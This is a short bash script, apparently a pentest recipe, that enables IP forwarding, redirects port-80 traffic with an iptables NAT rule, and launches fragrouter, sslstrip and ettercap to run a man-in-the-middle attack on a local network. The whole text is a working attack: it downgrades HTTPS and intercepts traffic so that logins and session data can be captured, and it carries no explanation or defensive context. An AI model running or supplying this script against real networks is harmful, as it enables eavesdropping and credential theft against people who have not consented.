#! /bin/bash
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
gnome-terminal -x fragrouter -B1
gnome-terminal -x python /pentest/web/sslstrip/sslstrip.py -a -k -l 10000
gnome-terminal -x ettercap -T -q -i eth0
